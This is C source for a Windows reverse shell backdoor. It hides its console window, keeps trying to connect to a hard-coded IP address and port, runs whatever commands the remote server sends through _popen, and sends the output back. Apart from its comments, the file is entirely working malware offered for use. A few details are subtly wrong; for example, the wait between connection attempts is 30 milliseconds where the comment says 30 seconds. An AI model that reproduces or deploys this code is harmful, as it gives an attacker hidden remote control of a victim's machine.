#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>

/**
 * The bzero() function erases the data in the n bytes of the memory
   starting at the location pointed to by s, by writing zeros (bytes
   containing '\0') to that area.
**/
// port bzero in linux for windows (for ease of use)
#define bzeroWin(p, size) (void) memset((p), 0, (size))

//=====================================================================================//

/**
 * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of
   other functions to identify the correct program and instance when passing
   commands or requesting data.
   
 * hPrev: used in 16bit windows, now 0
   lpCmdLine: contains command line arguments
   nCmdShow: flag for main application window state (minimized, maximized or normal)
***/

//====== Global Variables =======//
int sock;
struct sockaddr_in ServAddr;

boolean connected(SOCKET sock){
     char buf;
     int err = recv(sock, &buf, 1, MSG_PEEK);
     if(err == SOCKET_ERROR) {
        if (WSAGetLastError() != WSAEWOULDBLOCK) {
            closesocket(sock);
            return FALSE;
        }
     }
     return TRUE;
}

//============ Shell ============//
void Cmd() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (connected(sock)) {
		bzeroWin(buffer, 1024);
		bzeroWin(container, sizeof(container));
		bzeroWin(total_response, sizeof(total_response));
        // receive variables
        recv(sock, buffer, 1024, 0);

        // q - quit the connection
        if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		} else {
			FILE *fd;
            // Create a pipe and execute a command asynchronously.
			fd = _popen(buffer, "r");

            // store first 1024 bytes of resonse in container
            // when response exceeds 1024 bytes, add container to total_resonse
			while(fgets(container, 1024, fd) != NULL) {
				strcat(total_response, container);
			}

            // send response to server
			send(sock, total_response, sizeof(total_response), 0);
			// close file descriptor
            fclose(fd);
		}
    }
}

//============ Main ============//
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // hide the window
    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    
    // setup socket for connection
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.43.31";
    ServPort = 50005;

    /**
     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL.
     * It allows an application or DLL to specify the version of Windows Sockets required and
     * retrieve details of the specific Windows Sockets implementation.
     * 
     * WSAStartup function initiates use of Winsock DLL bya process.
     **/
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

    // AF_INET represents connection over IPv4 
    // SOCK_STREAM defines TCP connection
    // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    // define params for ServAddr variable
    ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
    
    reconnect:
    // attempt to connect to server in evry 30 seconds until it is successful 
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
		Sleep(30);
	}

    Cmd();
}